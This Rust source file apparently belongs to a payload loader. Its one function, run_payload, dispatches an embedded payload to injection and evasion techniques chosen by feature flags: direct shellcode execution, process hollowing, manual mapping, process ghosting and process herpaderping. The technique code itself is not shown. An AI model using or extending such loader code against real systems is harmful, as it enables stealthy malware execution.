pub unsafe fn run_payload(base: *mut u8) {
    unsafe {
        let payload = &crate::get_payload::get_payload(base);
        #[cfg(feature = "shellcode_direct")]
        crate::techniques::shellcode::direct::direct(&payload);
        #[cfg(feature = "shellcode_hypnosis")]
        crate::techniques::shellcode::hypnosis::hypnosis(&payload);
        #[cfg(feature = "shellcode_processhollowing")]
        crate::techniques::shellcode::process_hollowing::process_hollowing(&payload);
        #[cfg(feature = "pe_manualmap")]
        crate::techniques::pe::manual_map::manual_map(&payload);
        #[cfg(feature = "pe_processhollowing")]
        crate::techniques::pe::process_hollowing::process_hollowing(&payload);
        #[cfg(feature = "pe_processghosting")]
        crate::techniques::pe::process_ghosting::process_ghosting(&payload);
        #[cfg(feature = "pe_ghostlyhollowing")]
        crate::techniques::pe::process_ghosting::ghostly_hollowing(&payload);
        #[cfg(feature = "pe_processherpaderping")]
        crate::techniques::pe::process_herpaderping::process_herpaderping(&payload);
        #[cfg(feature = "pe_herpaderplyhollowing")]
        crate::techniques::pe::process_herpaderping::herpaderply_hollowing(&payload);
    }
}
